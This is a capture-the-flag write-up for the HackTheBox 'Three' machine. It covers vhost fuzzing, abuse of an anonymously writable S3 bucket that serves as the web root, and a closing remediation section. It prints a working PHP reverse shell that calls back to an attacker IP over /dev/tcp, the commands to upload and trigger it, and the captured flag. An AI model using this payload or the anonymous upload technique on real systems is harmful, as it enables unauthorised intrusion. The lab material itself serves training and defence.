# Three (HTB) - S3 Bucket Misconfiguration & Virtual Host Routing

**Platform:** HackTheBox (Starting Point) | **Target OS:** Linux | **Difficulty:** Very Easy  
**Focus:** Virtual Host (VHost) Routing, Cloud Storage Mechanics (AWS S3 Buckets), Insecure Direct Object Access, and PHP Arbitrary Code Execution.

---

## 🎯 Executive Summary
The "Three" machine serves as an excellent simulation of Cloud-Infrastructure vulnerabilities merged with traditional Web routing. The attack chain consisted of:
1. **Virtual Host Routing:** Identifying a backend routing mechanism relying on the `Host` header and bypassing it via local DNS resolution.
2. **Subdomain Fuzzing:** Uncovering a hidden backend subdomain (`s3.thetoppers.htb`) acting as a localized cloud storage instance.
3. **S3 Bucket Misconfiguration:** Exploiting a globally writable S3 bucket that directly served the front-end web root.
4. **Remote Code Execution (RCE):** Uploading a malicious PHP reverse shell payload to the bucket and invoking it via the primary domain to achieve execution as the `www-data` service user.

---

## 1. Network Reconnaissance & VHost Routing

We initiated rapid port discovery utilizing `RustScan`.

```bash
$ rustscan -a 10.129.227.248 --ulimit 5000
Open 10.129.227.248:22
Open 10.129.227.248:80
```

**Technical Analysis (The `Host` Header Dependency):**
Initial access to Port 80 via IP address failed to render the proper web application. However, OSINT gathered from the default page leaked a domain name: `thetoppers.htb`. 
Web servers (like Apache/Nginx) often utilize **Name-Based Virtual Hosting**. This means multiple websites run on the same IP, and the server decides which site to serve based on the HTTP `Host` header provided by the client. To bypass this local resolution issue, we appended the target to our `/etc/hosts` file:

```bash
$ echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## 2. Subdomain Fuzzing & Cloud Infrastructure Discovery

With local DNS resolution established, we initiated Virtual Host fuzzing using `Gobuster` to identify hidden backend subdomains or administrative portals.

```bash
$ gobuster vhost -u http://thetoppers.htb -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb Status: 404 [Size: 21]
```

**Intelligence Analysis:**
The discovery of `s3.thetoppers.htb` is critical. In cloud architecture, `s3` refers to Amazon's Simple Storage Service. The `404 Not Found` with a byte size of `21` typically indicates an API endpoint that exists but requires a specific request format (like `NoSuchBucket`), confirming that the target hosts a localized S3-compatible service (e.g., MinIO or local AWS emulation).

---

## 3. S3 Access Control Abuse & Remote Code Execution

We interacted with the exposed S3 endpoint using the `aws-cli` tool. To bypass authentication checks, we utilized the `--no-sign-request` flag, testing for public/anonymous access misconfigurations.

```bash
$ aws s3 ls s3://thetoppers.htb/ --no-sign-request --endpoint-url http://s3.thetoppers.htb
2026-08-16 18:05:14          0 .htaccess
2026-08-16 18:05:14      11952 index.php
```

**The Flaw (Insecure Object Access):**
The bucket `thetoppers.htb` was configured with public Read/Write permissions. Furthermore, the presence of `index.php` and `.htaccess` indicated that this specific S3 bucket was acting as the direct `DocumentRoot` for the primary website (`http://thetoppers.htb`).

### Weaponization and Execution
We crafted a standard PHP Reverse Shell payload leveraging a direct bash socket connection to bypass intermediate binary constraints:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.51/4444 0>&1'");
?>
```

We uploaded the payload directly to the public S3 bucket using the AWS CLI:
```bash
$ aws s3 cp shell.php s3://thetoppers.htb/shell.php --no-sign-request --endpoint-url http://s3.thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

Finally, we triggered the execution of the PHP file by requesting it through the primary web server domain via `curl`:
```bash
$ curl http://thetoppers.htb/shell.php
```

We successfully caught the callback on our local Netcat listener, achieving Remote Code Execution (RCE) as the `www-data` service user and retrieving the target flag.

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.227.248 56428
www-data@three:/var/www/html$ whoami
www-data

www-data@three:/var/www/html$ cat /var/www/flag.txt
a980d99281a28d638ac68b9bf9453c2b
```

---

## 4. Defensive Remediation & Secure Cloud Configuration

To secure S3-compatible endpoints in production environments:
1. **Enforce Identity and Access Management (IAM):** S3 buckets must never allow anonymous or `--no-sign-request` write operations. Implement strict Access Control Lists (ACLs) and Bucket Policies that restrict write access to authorized backend services only.
2. **Block Public Access (BPA):** Ensure that the "Block Public Access" feature is enabled at the bucket level to prevent accidental exposure of sensitive files.
3. **Execution Restrictions:** Web servers pulling content from Object Storage should disable the execution of dynamic scripts (e.g., PHP parsing) from those specific storage directories, serving them strictly as static assets.
